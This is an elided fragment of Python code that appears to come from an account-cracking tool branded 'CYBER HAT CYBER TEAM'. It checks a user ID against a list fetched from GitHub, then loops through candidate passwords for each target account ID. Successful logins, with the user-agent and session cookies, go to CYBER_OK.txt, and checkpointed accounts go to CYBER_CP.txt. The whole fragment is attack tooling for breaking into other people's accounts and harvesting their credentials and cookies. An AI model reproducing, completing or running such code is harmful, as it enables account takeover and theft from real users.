...
def chk():
  ...
  try: 
    httpCaht = requests.get("https://github.com/Hacker25802/chil/blob/main/Sata_ok.txt").text 
    if id in httpCaht: 
      ...
      print('\033[92m[•]\033[97mMY ID : CYBER HAT CYBER TEAM [ DARK-HUNTER ]')
...
def passwrd():
	...
	print(f' Results OK Saved In :CYBER_OK.txt')
...
def crack(idf,pwv):
	global loop,ok,cp
	#sys.stdout.write(f'\r \33[1;94m[CYBER\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(H,loop,len(ok))),
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r \33[1;95m[CYBER]  {h}[{kk}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				open('CYBER_CP.txt' , 'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				open('CYBER_OK.txt' , 'a').write(idf+'|'+pw+'|'+ua+kuki+'\n')
				break
